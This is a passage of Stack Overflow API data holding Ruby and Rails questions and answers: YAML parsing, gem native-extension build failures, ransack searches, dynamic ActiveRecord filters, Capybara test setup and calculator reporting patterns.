"https://stackoverflow.com/users/5026242/sunrise487"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 866, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1511953115, "creation_date": 1511928623, "last_edit_date": 1511928673, "question_id": 47544920, "link": "https://stackoverflow.com/questions/47544920/parse-nested-yaml-into-key-value-pairs-with-ruby", "title": "Parse Nested YAML into Key Value Pairs with Ruby", "body": "<p>I am looking to solve parsing YAML data like this with ruby</p>\n\n<pre><code>access_log:\n  stored_proc: getsomething\n    uses:\n      usedin: some breadcrumb\n</code></pre>\n\n<p>I was able to parse into key-pair for (access_log>> stored_proc>> getsomething )\nbut having issues with flow for(access_log >> uses >> usedin >> some breadcrumb) to have usedin >> some breadcrumb as key value pair. I would appreciate your help </p>\n"}, {"tags": ["ruby-on-rails", "ruby", "linux", "debian"], "answers": [{"tags": [], "owner": {"reputation": 3063, "user_id": 1682038, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/90c9c92c135240a02e9bcd1c886bcae8?s=128&d=identicon&r=PG", "display_name": "rony36", "link": "https://stackoverflow.com/users/1682038/rony36"}, "is_accepted": true, "score": 3, "last_activity_date": 1511918905, "creation_date": 1511918905, "answer_id": 47543626, "question_id": 47543395, "link": "https://stackoverflow.com/questions/47543395/bundle-install-command-wont-install-my-gems/47543626#47543626", "title": "Bundle Install command won&#39;t install my gems?", "body": "<p>First of all follow the instruction (please avoid <code>sudo</code>):</p>\n\n<blockquote>\n  <p>Don't run Bundler as root. Bundler can ask for sudo if it is needed, \n  and installing your bundle as root will break this application for all\n  non-root users on this machine.</p>\n</blockquote>\n\n<p>To resolve this issue in <code>linux</code>, run:</p>\n\n<pre><code>sudo apt install ruby2.3-dev\n</code></pre>\n\n<p>Cheers!</p>\n"}], "owner": {"reputation": 85, "user_id": 8686721, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh5.googleusercontent.com/-7d7yVSTuYPs/AAAAAAAAAAI/AAAAAAAAAHo/7GUa4JWzAeA/photo.jpg?sz=128", "display_name": "Colin Marshall", "link": "https://stackoverflow.com/users/8686721/colin-marshall"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 577, "favorite_count": 0, "accepted_answer_id": 47543626, "answer_count": 1, "score": 1, "last_activity_date": 1511918905, "creation_date": 1511917097, "question_id": 47543395, "link": "https://stackoverflow.com/questions/47543395/bundle-install-command-wont-install-my-gems", "title": "Bundle Install command won&#39;t install my gems?", "body": "<p>Okay, so I'm very new to Rails, and am just beginning to feel my way around my new Linux operating system as well. </p>\n\n<p>I'm currently doing a project for school, and I've followed all of the directions to perfection. For consistency purposes, they want specific versions of both rails and gemsets. </p>\n\n<p>After I have initialized rails in my directory, I then run a \n<code>bundle install</code> command, and have several installation issues which I are in the code block as follows:</p>\n\n<pre><code>user@user-ThinkPad-T430 ~/code/bloccit $ sudo bundle install\n[sudo] password for user: \nDon't run Bundler as root. Bundler can ask for sudo if it is needed, \nand installing your bundle as root will break this application for all\nnon-root users on this machine.\nFetching gem metadata from https://rubygems.org/...........\nFetching version metadata from https://rubygems.org/...\nFetching dependency metadata from https://rubygems.org/..\nResolving dependencies.....\nUsing rake 12.3.0\nUsing concurrent-ruby 1.0.5\nInstalling json 1.8.6 with native extensions\n\nGem::Ext::BuildError: ERROR: Failed to build gem native extension.\n\ncurrent directory: /var/lib/gems/2.3.0/gems/json-\n1.8.6/ext/json/ext/generator\n/usr/bin/ruby2.3 -r ./siteconf20171128-11271-1ah858h.rb extconf.rb\nmkmf.rb can't find header files for ruby at \n/usr/lib/ruby/include/ruby.h\n\nextconf failed, exit code 1\n\nGem files will remain installed in /var/lib/gems/2.3.0/gems/json-1.8.6 \nfor inspection.\nResults logged to /var/lib/gems/2.3.0/extensions/x86_64-\nlinux/2.3.0/json-1.8.6/gem_make.out\nUsing minitest 5.10.3\nUsing thread_safe 0.3.6\nUsing builder 3.2.3\nUsing erubis 2.7.0\nUsing mini_portile2 2.3.0\nUsing crass 1.0.3\nUsing rack 1.6.8\nUsing mini_mime 1.0.0\nUsing arel 6.0.4\nUsing bundler 1.11.2\nUsing coffee-script-source 1.12.2\nUsing execjs 2.7.0\nUsing thor 0.20.0\nInstalling ffi 1.9.18 with native extensions\n\nGem::Ext::BuildError: ERROR: Failed to build gem native extension.\n\ncurrent directory: /var/lib/gems/2.3.0/gems/ffi-1.9.18/ext/ffi_c\n/usr/bin/ruby2.3 -r ./siteconf20171128-11271-1382ks7.rb extconf.rb\nmkmf.rb can't find header files for ruby at \n/usr/lib/ruby/include/ruby.h\n\nextconf failed, exit code 1\n\nGem files will remain installed in /var/lib/gems/2.3.0/gems/ffi-1.9.18 \nfor inspection.\nResults logged to /var/lib/gems/2.3.0/extensions/x86_64-\nlinux/2.3.0/ffi-1.9.18/gem_make.out\nInstalling pg 0.21.0 with native extensions\n\nGem::Ext::BuildError: ERROR: Failed to build gem native extension.\n\ncurrent directory: /var/lib/gems/2.3.0/gems/pg-0.21.0/ext\n/usr/bin/ruby2.3 -r ./siteconf20171128-11271-171n79p.rb extconf.rb\nmkmf.rb can't find header files for ruby at \n/usr/lib/ruby/include/ruby.h\n\nextconf failed, exit code 1\n\nGem files will remain installed in /var/lib/gems/2.3.0/gems/pg-0.21.0 \nfor inspection.\nResults logged to /var/lib/gems/2.3.0/extensions/x86_64-\nlinux/2.3.0/pg-0.21.0/gem_make.out\nUsing rb-fsevent 0.10.2\nUsing tilt 2.0.8\nInstalling sqlite3 1.3.13 with native extensions\n\nGem::Ext::BuildError: ERROR: Failed to build gem native extension.\n\ncurrent directory: /var/lib/gems/2.3.0/gems/sqlite3-1.3.13/ext/sqlite3\n/usr/bin/ruby2.3 -r ./siteconf20171128-11271-ml1ggl.rb extconf.rb\nmkmf.rb can't find header files for ruby at \n/usr/lib/ruby/include/ruby.h\n\nextconf failed, exit code 1\n\nGem files will remain installed in /var/lib/gems/2.3.0/gems/sqlite3-\n1.3.13 for inspection.\nResults logged to /var/lib/gems/2.3.0/extensions/x86_64-\nlinux/2.3.0/sqlite3-1.3.13/gem_make.out\nUsing turbolinks-source 5.0.3\nUsing i18n 0.9.1\nAn error occurred while installing json (1.8.6), and Bundler cannot \ncontinue.\nMake sure that `gem install json -v '1.8.6'` succeeds before bundling.\n</code></pre>\n\n<p>The main error seems to be the <code>Gem::Ext::BuildError: ERROR: Failed to build gem native extension.</code> line, but it's also having problems installing json within the bundler. </p>\n\n<p>Any helpful advice or tips would be appreciated!</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "ransack"], "answers": [{"tags": [], "owner": {"reputation": 110, "user_id": 6438011, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/276000143d7e22751c1c84876aa12b63?s=128&d=identicon&r=PG&f=1", "display_name": "cm1745", "link": "https://stackoverflow.com/users/6438011/cm1745"}, "is_accepted": false, "score": 0, "last_activity_date": 1511977139, "creation_date": 1511977139, "answer_id": 47558604, "question_id": 47542518, "link": "https://stackoverflow.com/questions/47542518/ransack-search-on-has-one-through-alias/47558604#47558604", "title": "Ransack search on has_one :through (alias)", "body": "<p>I don't think you need a ransacker specifically. I believe in your view, inside a <code>search_form_for</code> you just simply could do:</p>\n\n<pre><code>&lt;%= f.search_field :instructor_user_name %&gt;\n</code></pre>\n\n<p>Also, in your controller instead of <code>@survey_responses = paginate(@q)</code> I think you need <code>@survey_responses = paginate(@survey_responses)</code> so you can paginate the responses not the ransack object (could be wrong on this based on what pagination gem you're using).</p>\n"}], "owner": {"reputation": 11, "user_id": 8377029, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-X7iF6ngovTM/AAAAAAAAAAI/AAAAAAAAAec/51yiJhLj1LU/photo.jpg?sz=128", "display_name": "Regina DeAngelis", "link": "https://stackoverflow.com/users/8377029/regina-deangelis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 556, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1511977139, "creation_date": 1511910912, "last_edit_date": 1511967953, "question_id": 47542518, "link": "https://stackoverflow.com/questions/47542518/ransack-search-on-has-one-through-alias", "title": "Ransack search on has_one :through (alias)", "body": "<p>I'm attempting to use ransack to search for an attribute on a has_one association in a model.<br>\nCurrently in my model I have:</p>\n\n<pre><code>class SurveyResponse &lt; ActiveRecord::Base\n  belongs_to :course_schedule \n  has_one :instructor, through: :course_schedule\n  has_one :instructor_user, through: :instructor, foreign_key: \"user_id\", source: :user \n</code></pre>\n\n<p>I want to search by <code>instructor_user's</code> name in my survey response view.  Should I be doing this with a ransacker?  My understanding of Arel is very limited, but can I do something like this?  (I know this doesn't work as it is..)</p>\n\n<pre><code>def self.ransackable_attributes(auth_object)\n[\n  'created_at',\n  'instructor_user_name'\n]\nend\n\nransacker :instructor_user_name, type: :string do \n  Arel.sql('string(survey_responses.instructor_user.last_name)')\nend \n</code></pre>\n\n<p>In my survey response controller I currently have: </p>\n\n<pre><code>def index\n  @search_associations = [:course, :user]\n\n  @q = SurveyResponse.where(corporation_id: @corporation.id).ransack(params[:q])\n\n  @q.build_condition\n\n  @survey_responses =  @q.result.includes(:course, :user, :course_schedule, :instructor, :instructor_user).order(created_at: :asc)\n\n  @survey_responses = paginate(@q)\nend\n</code></pre>\n\n<p>Any help, resources, and guidance would be greatly appreciated.  </p>\n"}, {"tags": ["ruby-on-rails", "ruby", "ruby-on-rails-5"], "answers": [{"tags": [], "owner": {"reputation": 611, "user_id": 5609392, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/NrRx6.jpg?s=128&g=1", "display_name": "Ahsan", "link": "https://stackoverflow.com/users/5609392/ahsan"}, "is_accepted": false, "score": 1, "last_activity_date": 1511916257, "creation_date": 1511916257, "answer_id": 47543295, "question_id": 47542036, "link": "https://stackoverflow.com/questions/47542036/an-error-occurred-while-installing-bindex-0-5-0/47543295#47543295", "title": "An error occurred while installing bindex (0.5.0)", "body": "<p>I have found my solution. I just change the Xcode command line tools path and it is starts working. </p>\n\n<p>how to change Xcode command line tools path=>\nXcode -> Preferences -> Locations, select preferred Xcode from the drop down of command line tools list. </p>\n"}, {"tags": [], "owner": {"reputation": 2228, "user_id": 797285, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/155e3a832ac9eda845e10564e4e3c1a1?s=128&d=identicon&r=PG", "display_name": "lafeber", "link": "https://stackoverflow.com/users/797285/lafeber"}, "is_accepted": false, "score": 0, "last_activity_date": 1605870557, "creation_date": 1605870557, "answer_id": 64928392, "question_id": 47542036, "link": "https://stackoverflow.com/questions/47542036/an-error-occurred-while-installing-bindex-0-5-0/64928392#64928392", "title": "An error occurred while installing bindex (0.5.0)", "body": "<p>If you encounter this after installing Big Sur, <code>xcode-select --install</code> fixed it for me.</p>\n"}], "owner": {"reputation": 611, "user_id": 5609392, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/NrRx6.jpg?s=128&g=1", "display_name": "Ahsan", "link": "https://stackoverflow.com/users/5609392/ahsan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1055, "favorite_count": 1, "answer_count": 2, "score": 1, "last_activity_date": 1605870557, "creation_date": 1511908293, "question_id": 47542036, "link": "https://stackoverflow.com/questions/47542036/an-error-occurred-while-installing-bindex-0-5-0", "title": "An error occurred while installing bindex (0.5.0)", "body": "<p>\"An error occurred while installing bindex (0.5.0), and Bundler cannot continue.\nMake sure that <code>gem install bindex -v '0.5.0'</code> succeeds before bundling.\"</p>\n\n<p>when I hit bundle install and this error comes up with a message \"In Gemfile:\n  web-console was resolved to 3.5.1, which depends on\n    bindex\"</p>\n\n<p>ruby version: 2.4.2</p>\n\n<p>rails: 5.1.4</p>\n\n<p>what should I do now?</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "activerecord", "rails-activerecord"], "comments": [{"owner": {"reputation": 394580, "user_id": 479863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/ArUCE.jpg?s=128&g=1", "display_name": "mu is too short", "link": "https://stackoverflow.com/users/479863/mu-is-too-short"}, "edited": false, "score": 0, "creation_date": 1511919569, "post_id": 47541823, "comment_id": 82044506, "body": "Maybe not an exact duplicate but close enough IMO."}], "answers": [{"comments": [{"owner": {"reputation": 323, "user_id": 1934168, "user_type": "registered", "accept_rate": 16, "profile_image": "https://www.gravatar.com/avatar/a8e85918d3db651edd04097020cbf5f1?s=128&d=identicon&r=PG", "display_name": "Hilmi Yamc\u0131", "link": "https://stackoverflow.com/users/1934168/hilmi-yamc%c4%b1"}, "edited": false, "score": 0, "creation_date": 1511908111, "post_id": 47541935, "comment_id": 82041155, "body": "That seem to be great, at least according to my if-else solution. Can I use will-paginate gem with your chain-based solution ?"}, {"owner": {"reputation": 51013, "user_id": 976775, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/30bd66ad1795804aebe249d8bcb14409?s=128&d=identicon&r=PG", "display_name": "MrYoshiji", "link": "https://stackoverflow.com/users/976775/mryoshiji"}, "reply_to_user": {"reputation": 323, "user_id": 1934168, "user_type": "registered", "accept_rate": 16, "profile_image": "https://www.gravatar.com/avatar/a8e85918d3db651edd04097020cbf5f1?s=128&d=identicon&r=PG", "display_name": "Hilmi Yamc\u0131", "link": "https://stackoverflow.com/users/1934168/hilmi-yamc%c4%b1"}, "edited": false, "score": 0, "creation_date": 1511908219, "post_id": 47541935, "comment_id": 82041204, "body": "yes, ActiveRecord::Relation (returned by the <code>where</code> calls basically) allows you to do chain scoping, by either calling several <code>scope</code>s defined in your model or your own custom <code>where</code> (like I did in this answer). will-paginate works with either a AR::Relation or an array if I recall correctly."}], "tags": [], "owner": {"reputation": 51013, "user_id": 976775, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/30bd66ad1795804aebe249d8bcb14409?s=128&d=identicon&r=PG", "display_name": "MrYoshiji", "link": "https://stackoverflow.com/users/976775/mryoshiji"}, "is_accepted": false, "score": 5, "last_activity_date": 1511907798, "creation_date": 1511907798, "answer_id": 47541935, "question_id": 47541823, "link": "https://stackoverflow.com/questions/47541823/ruby-query-active-model-dynamically/47541935#47541935", "title": "Ruby, query active model dynamically", "body": "<p>You can chain the different scopes with ActiveRecord:</p>\n\n<pre><code>@products = Product.all\n@products = @products.where(totalPrice: params[:totalPrice]) if params[:totalPrice]\n@products = @products.where(itemCount: params[:itemCount]) if params[:itemCount]\n@products = @products.where(created_date: params[:created_date]) if params[:created_date]\n# etc...\n</code></pre>\n\n<p>And this can easily be dynamic (but white-listed):</p>\n\n<pre><code>filterable_columns = %i(itemCount totalPrice created_date)\n@products = Product.all\nfilterable_columns.each do |column|\n  @products = @products.where(column =&gt; params[column]) if params[column]\nend\n</code></pre>\n"}], "owner": {"reputation": 323, "user_id": 1934168, "user_type": "registered", "accept_rate": 16, "profile_image": "https://www.gravatar.com/avatar/a8e85918d3db651edd04097020cbf5f1?s=128&d=identicon&r=PG", "display_name": "Hilmi Yamc\u0131", "link": "https://stackoverflow.com/users/1934168/hilmi-yamc%c4%b1"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 52, "favorite_count": 0, "closed_date": 1511919544, "answer_count": 1, "score": 1, "last_activity_date": 1511919585, "creation_date": 1511907338, "last_edit_date": 1511919585, "question_id": 47541823, "link": "https://stackoverflow.com/questions/47541823/ruby-query-active-model-dynamically", "closed_reason": "Duplicate", "title": "Ruby, query active model dynamically", "body": "<p>I have an Order model in my ruby on rails application which has several attributes. I want to query those orders according to parameters given by users such as itemCount, totalPrice and created date.</p>\n\n<p>If one of those attributes is given, I mean it's not nil, I need to query model by using it. </p>\n\n<p>I can do something like:</p>\n\n<pre><code>if params[:totalPrice] and params[:itemCount] and params[:created_date]\n    @product = Product.where(totalPrice: params[:totalPrice],itemCount: params[:itemCount],created_date: params[:created_date])  \nelsif params[:totalPrice] and params[:itemCount]\n    @product = Product.where(totalPrice: params[:totalPrice],itemCount: params[:itemCount])\nelsif params[:totalPrice] and params[:created_date]\n    @product = Product.where(totalPrice: params[:totalPrice],created_date: params[:created_date])  \nelsif params[:itemCount] and params[:created_date]\n    @product = Product.where(itemCount: params[:itemCount],created_date: params[:created_date]) \nelseif ....(and continues)\n</code></pre>\n\n<p>However, I can't be sure about that. Maybe there is there a \"Ruby\" way to achieve that problem.</p>\n\n<p>What is the best practice to do that,</p>\n\n<p>Thanks.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "testing", "capybara", "minitest"], "answers": [{"tags": [], "owner": {"reputation": 48, "user_id": 1016929, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0cXIe.jpg?s=128&g=1", "display_name": "J. Levine", "link": "https://stackoverflow.com/users/1016929/j-levine"}, "is_accepted": false, "score": 0, "last_activity_date": 1512770677, "creation_date": 1512770677, "answer_id": 47722843, "question_id": 47540511, "link": "https://stackoverflow.com/questions/47540511/capybara-not-working-with-mini-test-and-rails-keep-getting-uninitialized-const/47722843#47722843", "title": "Capybara not working with mini-test and rails. Keep getting &quot;uninitialized constant Capybara::Minitest::Capybara&quot;", "body": "<p>Try taking out these lines from your test_helper.rb:</p>\n\n<pre><code>require \"minitest/rails\"\nrequire 'capybara/rails'\nrequire 'capybara/minitest'\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user8990770"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 224, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1512770677, "creation_date": 1511901427, "question_id": 47540511, "link": "https://stackoverflow.com/questions/47540511/capybara-not-working-with-mini-test-and-rails-keep-getting-uninitialized-const", "title": "Capybara not working with mini-test and rails. Keep getting &quot;uninitialized constant Capybara::Minitest::Capybara&quot;", "body": "<p>I know this usually means something is missing by way of a require, but I can't figure it out. Here's my test_helper.rb:</p>\n\n<pre><code>ENV[\"RAILS_ENV\"] = \"test\"\nrequire File.expand_path(\"../../config/environment\", __FILE__)\nrequire \"rails/test_help\"\nrequire \"minitest/rails\"\nrequire 'capybara/rails'\nrequire 'capybara/minitest'\n\n# To add Capybara feature tests add `gem \"minitest-rails-capybara\"`\n# to the test group in the Gemfile and uncomment the following:\n\nrequire 'minitest/rails/capybara'\n</code></pre>\n\n<p>and a portion of my Gemfile.lock</p>\n\n<pre><code>minitest-capybara (0.8.2)\n  capybara (~&gt; 2.2)\n  minitest (~&gt; 5.0)\n  rake\nminitest-metadata (0.6.0)\n  minitest (&gt;= 4.7, &lt; 6.0)\nminitest-rails (3.0.0)\n  minitest (~&gt; 5.8)\n  railties (~&gt; 5.0)\nminitest-rails-capybara (3.0.1)\n  capybara (~&gt; 2.7)\n  minitest-capybara (~&gt; 0.8)\n  minitest-metadata (~&gt; 0.6)\n  minitest-rails (~&gt; 3.0)\n</code></pre>\n\n<p>If I comment out this line:</p>\n\n<pre><code>require 'minitest/rails/capybara'\n</code></pre>\n\n<p>I get:</p>\n\n<pre><code>undefined method `feature' for main:Object (NoMethodError)\n</code></pre>\n\n<p>While trying to test a feature. </p>\n\n<p>Anyone have any ideas?</p>\n\n<p>Full trace for gigs:</p>\n\n<pre><code>ruby test/features/can_access_home_test.rb\n/usr/local/bundle/gems/minitest-capybara-0.8.2/lib/capybara/assertions.rb:37:in `&lt;module:Assertions&gt;': uninitialized constant Capybara::Minitest::Capybara (NameError)\n    from /usr/local/bundle/gems/minitest-capybara-0.8.2/lib/capybara/assertions.rb:2:in `&lt;module:Capybara&gt;'\n    from /usr/local/bundle/gems/minitest-capybara-0.8.2/lib/capybara/assertions.rb:1:in `&lt;top (required)&gt;'\n    from /usr/local/bundle/gems/minitest-capybara-0.8.2/lib/minitest/capybara.rb:23:in `&lt;top (required)&gt;'\n    from /usr/local/bundle/gems/minitest-capybara-0.8.2/lib/minitest-capybara.rb:2:in `&lt;top (required)&gt;'\n    from /usr/local/bundle/gems/minitest-rails-capybara-3.0.1/lib/minitest/rails/capybara.rb:3:in `&lt;top (required)&gt;'\n    from /usr/src/app/test/test_helper.rb:11:in `&lt;top (required)&gt;'\n    from test/features/can_access_home_test.rb:1:in `require_relative'\n    from test/features/can_access_home_test.rb:1:in `&lt;main&gt;'\n</code></pre>\n"}, {"tags": ["ruby", "design-patterns"], "answers": [{"comments": [{"owner": {"reputation": 6859, "user_id": 2643172, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/VMWUe.jpg?s=128&g=1", "display_name": "Mauricio Moraes", "link": "https://stackoverflow.com/users/2643172/mauricio-moraes"}, "edited": false, "score": 0, "creation_date": 1511902313, "post_id": 47540639, "comment_id": 82038545, "body": "Hey spickelmann, thanks. I understand. That&#39;s a lot cleaner. But that would instantiate all those values for all those times where I just want to get the output value. Wouldn&#39;t it be memory expensive? (My report has a lot of intermediate variables)."}, {"owner": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "reply_to_user": {"reputation": 6859, "user_id": 2643172, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/VMWUe.jpg?s=128&g=1", "display_name": "Mauricio Moraes", "link": "https://stackoverflow.com/users/2643172/mauricio-moraes"}, "edited": false, "score": 0, "creation_date": 1511902662, "post_id": 47540639, "comment_id": 82038730, "body": "Yes, it would store all values as long as your calculator instance is assigned to a variable. Is that need memory? Sure. It really depends on the number of calculations and steps. In the above examples we are talking about some bytes, how many steps does your calculator have and is using a few kb more memory really an issue on your machine?"}], "tags": [], "owner": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "is_accepted": false, "score": 1, "last_activity_date": 1511901906, "creation_date": 1511901906, "answer_id": 47540639, "question_id": 47540290, "link": "https://stackoverflow.com/questions/47540290/design-pattern-for-a-calculation-that-has-to-output-a-report-in-ruby/47540639#47540639", "title": "Design pattern for a calculation that has to output a report in Ruby", "body": "<p>Why don't you just make all intermediate results public methods and chain the results in the final output?</p>\n\n<p>Perhaps something like this:</p>\n\n<pre><code>class Calculator\n  def initialize(parameter)\n    @parameter = parameter\n  end\n\n  def output \n    op_3_result\n  end\n\n  def op_1_result\n    @op_1_result ||= operation_1(parameter)\n  end\n\n  def op_2_result\n    @op_2_result ||= operation2(op_1_result) \n  end\n\n  def op_3_result\n    @op_3_result ||= operation3(op_2_result) \n  end\n\n  private\n\n  def operation1(arg)\n    # ...\n  end\n\n  def operation2(arg)\n    # ...\n  end\n\n  def operation3(arg)\n    # ...\n  end\n\n  attr_reader :parameter\nend\n</code></pre>\n\n<p>That would allow you to call whatever you need on the same instance:</p>\n\n<pre><code>calculator = Calculator.new(1234)\ncalculator.output       #=&gt; the final result\ncalculator.op_2_result  #=&gt; the intermediate result of step 2\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "is_accepted": false, "score": 1, "last_activity_date": 1511906809, "last_edit_date": 1511906809, "creation_date": 1511905670, "answer_id": 47541470, "question_id": 47540290, "link": "https://stackoverflow.com/questions/47540290/design-pattern-for-a-calculation-that-has-to-output-a-report-in-ruby/47541470#47541470", "title": "Design pattern for a calculation that has to output a report in Ruby", "body": "<p>You could use a different pattern with <code>Report</code> being its own class and allow it to just pass through when reporting is turned off.  Here is a simple example:</p>\n\n<pre><code>class Calculator\n  attr_reader :report\n  def initialize(parameter_1, reporting=false)\n    @parameter_1 = parameter_1\n    @report = Report.new(reporting)\n  end\n  def output \n    op1 = operation_1(report.capture(:param1,@parameter_1))\n    report.capture(:op1,op1)\n    op2 = report.capture(:op2) { operation_2(op1) }\n    operation_3(op2)\n  end\n  def operation_1(param);\n    param + 7\n  end\n  def operation_2(param); \n    param - 3\n  end\n  def operation_3(param); \n    param * 2\n  end\nend\n\nclass Report\n  attr_reader :reporting, :reportables\n  def initialize(reporting)\n    @reporting = reporting\n    @reportables = {}\n  end\n  def capture(key, val=nil,&amp;block)\n    warn \"Block supercedes value\" if val &amp;&amp; block_given?\n    result = block_given? ? block.call : val  \n    @reportables[key] = result if reporting\n    result\n  end \n  def [](key)\n    return 'No Reporting' unless reporting\n    @reportables[key]\n  end\nend\n</code></pre>\n\n<p>Then you can use like so </p>\n\n<pre><code>c = Calculator.new(12)\nc.output \n#=&gt; 32\nc.report[:op1] \n#=&gt; \"No Reporting\"\n\nc = Calculator.new(12, true)\nc.output \n#=&gt; 32 \nc.report[:op1] \n#=&gt; 19\nc.report[:param1]\n#=&gt; 12\n</code></pre>\n\n<p>This way each step can use a block for more complicated items where the result should be captured or just pass a value if you choose and intermediate steps like <code>operation_3</code> (in this case) that do not need to be \"captured\" can just flow through.</p>\n\n<p>If reporting is off then everything just flows through and the captures are ignored.</p>\n\n<p>Your <code>#output</code> method could also look like this (no intermediate locals at all although it does hurt the readability a bit)</p>\n\n<pre><code>  def output \n    operation_3 (\n      report.capture(:op2,\n        operation_2(\n          report.capture(:op1) do \n            operation_1(report.capture(:param1,@parameter_1))\n          end   \n        )\n      )\n    )\n  end\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 31, "user_id": 2398789, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/66e7001fb7f364c36bf90ac8858ebafc?s=128&d=identicon&r=PG&f=1", "display_name": "Keisuke", "link": "https://stackoverflow.com/users/2398789/keisuke"}, "is_accepted": false, "score": 2, "last_activity_date": 1511923066, "creation_date": 1511923066, "answer_id": 47544158, "question_id": 47540290, "link": "https://stackoverflow.com/questions/47540290/design-pattern-for-a-calculation-that-has-to-output-a-report-in-ruby/47544158#47544158", "title": "Design pattern for a calculation that has to output a report in Ruby", "body": "<p>I guess \"builder pattern\" is suitable and \"report pad\" should be injected from outside.</p>\n\n<pre><code>class Calculator\n\n  def initialize(*parameters)\n    @parameters = parameters\n  end\n\n  def report_to(report_pad)\n    @report_pad = report_pad\n    self\n  end\n\n  def output()\n    ret = @parameters[0].to_i + @parameters[1].to_i \n    report('Did p0  + p1')\n\n    ret\n  end\n\n  private\n\n  def report(message)\n    @report_pad &lt;&lt; \"\\n\".prepend(message) if @report_pad.respond_to? '&lt;&lt;'\n  end\n\nend\n\n####\n\nreports = \"\"\n\nresult = Calculator\n  .new(1, 2)\n  .report_to(reports)\n  .output()\n\nputs result, reports\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 3375, "user_id": 3676469, "user_type": "registered", "accept_rate": 17, "profile_image": "https://graph.facebook.com/100003443544248/picture?type=large", "display_name": "Hirurg103", "link": "https://stackoverflow.com/users/3676469/hirurg103"}, "is_accepted": false, "score": 1, "last_activity_date": 1511955623, "creation_date": 1511955623, "answer_id": 47551958, "question_id": 47540290, "link": "https://stackoverflow.com/questions/47540290/design-pattern-for-a-calculation-that-has-to-output-a-report-in-ruby/47551958#47551958", "title": "Design pattern for a calculation that has to output a report in Ruby", "body": "<p>You can use dependency injection like this:</p>\n\n<pre><code>class Calculator\n\n  def initialize(parameter_1, reporter = nil)\n    @parameter_1 = parameter_1\n    @reporter = reporter\n  end\n\n  def output \n    op_1_result = call_with_reporting :operation_1, @parameter_1\n    op_2_result = call_with_reporting :operation_2, op_1_result\n\n    operation_3(op_2_result)\n  end\n\n  def operation_1(param)\n    ...\n  end\n\n  def call_with_reporting(operation, *args)\n    result = self.send(operation, *args)\n    @reporter.report(operation, result) if @reporter\n    result\n  end\nend\n\nclass ConsoleReporter\n  def initialize\n    @results = {}\n  end\n\n  def report(operation, result)\n    @results[operation] = result\n  end\n\n  def run_report\n    puts @operations\n  end\nend\n</code></pre>\n\n<p>Now you can use Calculator like this:</p>\n\n<pre><code>reporter = ConsoleReporter.new\nCalculator.new(12, reporter).output\nreporter.run_report\n</code></pre>\n\n<p>Later you can use Calculator with other format reporter (like ToFileReporter)</p>\n"}], "owner": {"reputation": 6859, "user_id": 2643172, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/VMWUe.jpg?s=128&g=1", "display_name": "Mauricio Moraes", "link": "https://stackoverflow.com/users/2643172/mauricio-moraes"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 86, "favorite_count": 0, "answer_count": 4, "score": 0, "last_activity_date": 1511955623, "creation_date": 1511900604, "question_id": 47540290, "link": "https://stackoverflow.com/questions/47540290/design-pattern-for-a-calculation-that-has-to-output-a-report-in-ruby", "title": "Design pattern for a calculation that has to output a report in Ruby", "body": "<p>I have a class that does calculations. Most of the times it is used in the code to output a single value:</p>\n\n<p>Use: <code>value = Calculator.new(1234).output</code></p>\n\n<p>This is an example of the class definition:</p>\n\n<pre><code>class Calculator\n\n  def initialize(parameter_1)\n    @parameter_1 = parameter_1\n  end\n\n  def output \n    op_1_result = operation_1(@parameter_1)\n    op_2_result = operation_2(op_1_result)\n\n    operation_3(op_2_result)\n  end\n\n  def operation_1(param)\n  ...\n\nend\n</code></pre>\n\n<p>But sometimes the user has to print a report of the calculation, showing many of the variables from inside the calculations.</p>\n\n<p>The first solution I implemented was to pass a parameter at initialization telling the class that it should save some internal variables for the report, like 